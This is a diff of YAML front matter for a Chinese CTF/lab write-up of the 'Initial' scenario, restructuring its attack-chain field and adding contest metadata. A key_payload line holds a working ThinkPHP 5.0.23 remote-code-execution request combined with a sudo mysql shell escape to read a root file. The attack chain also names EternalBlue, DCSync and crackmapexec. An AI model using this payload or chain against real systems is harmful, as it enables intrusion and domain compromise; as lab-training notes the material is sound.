@@ -11,7 +11,13 @@ tags:
 - MS17-010
 - DCSync
 - 内网渗透
-attack_chain: ThinkPHP5.0.23 RCE→sudo mysql -e读flag1→frp代理→MS17-010打172.22.1.21→DCSync域管hash→crackmapexec读flag3
+attack_chain:
+- 'ThinkPHP5.0.23 RCE'
+- 'sudo mysql -e读flag1'
+- 'frp代理'
+- 'MS17-010打172.22.1.21'
+- 'DCSync域管hash'
+- 'crackmapexec读flag3'
 key_payload: _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls;sudo mysql -e '! cat /root/flag/flag01.txt';ms17_010_eternalblue
 one_liner: 春秋云境Initial仿真场景：ThinkPHP5 RCE+MS17-010+DCSync三段式内网
 lesson: 入门级内网靶场核心三件套：web RCE入口→MSF永恒之蓝→DCSync域控
@@ -57,6 +63,8 @@ prerequisites:
 - frp 内网代理
 - MSF 永恒之蓝（MS17-010）
 - impacket/crackmapexec DCSync 工具链
+contest_normalized: "春秋云境仿真场景"
+contest_year: 2024
 ---
 # 春秋云境仿真场景WP：Initial
 
